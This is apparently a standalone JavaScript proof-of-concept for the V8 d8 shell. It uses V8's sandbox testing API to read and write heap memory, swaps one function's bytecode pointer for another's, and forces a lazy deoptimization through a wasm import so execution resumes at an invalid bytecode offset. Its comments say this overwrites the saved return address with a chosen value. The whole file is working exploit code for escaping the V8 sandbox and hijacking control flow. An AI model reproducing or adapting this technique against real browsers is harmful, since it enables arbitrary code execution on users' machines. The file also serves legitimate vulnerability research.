
var memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function addrOf(obj)
{
    return Sandbox.getAddressOf(obj)
}

function read4(ptr)
{
    return memory.getUint32(ptr, true);
}

function write4(ptr, value)
{
    memory.setUint32(ptr, value, true);
}

const kTrustedDataOffset = 4
const kSharedFunctionInfoOffset = 0x10

d8.file.execute('D:\\23_11_2025\\v8\\test\\mjsunit\\wasm\\wasm-module-builder.js')

var o = {a : 10};
var cont = false

function foo() {} // dummy

function foo_for_bytecode_offset()
{
    try
    {
        foo();
        let a = 0x1111
        a = 0x2222,
        a = 0x33332222 // just for padding
    }
    catch(e) {} // bytecode offset handler index 0 is 29 which will be in the middle of 
                // 27 : 01 0d cf b7 13 14 LdaSmi.ExtraWide [336836559] in caller
}

foo_for_bytecode_offset()

function trigger_deopt()
{
    if (cont) 
    {
        o.a = {};
        throw 0x11111111; // overwrite saved rip, accumulator will be 0x22222222
    }
}

let builder = new WasmModuleBuilder();
let sig = builder.addType(makeSig([], [kWasmI32, kWasmI32])); // for prevent inlining
let trigger = builder.addImport("f", "trigger_deopt", kSig_v_v);
builder.addFunction("call_trigger_deopt", sig)
.addBody([
    kExprCallFunction, trigger,
    ...wasmI32Const(0),
    ...wasmI32Const(0),
]).exportFunc();
let instance = builder.instantiate({f: {trigger_deopt: trigger_deopt}});
let call_trigger_deopt = instance.exports.call_trigger_deopt;

function caller()
{
    let a = 1
    try
    {
        call_trigger_deopt();
    }
    catch(e)
    {
        a = 0x1413b7cf // cf: Star3, b7: return, overwrite saved rip by accumulator
        a = 0x22222222
    }
    
    return o.a;
}


// console.log('use this for bytecode offset:')
// dp(foo_for_bytecode_offset)
for(let i = 0; i < 1000; i++) 
    caller();

cont = true // deopt trigger_deopt, which when called will lazy deopt caller
let shared1 = read4(addrOf(foo_for_bytecode_offset) + kSharedFunctionInfoOffset);
let bytecode = read4(shared1 + kTrustedDataOffset - 1);
console.log('Bytecode address: ' + bytecode.toString(16));

let shared2 = read4(addrOf(caller) + kSharedFunctionInfoOffset);
write4(shared2 + kTrustedDataOffset - 1, bytecode); // patch bytecode for invalid bytecode offset

caller() // trigger deopt and overwrite rip to 0x22222222


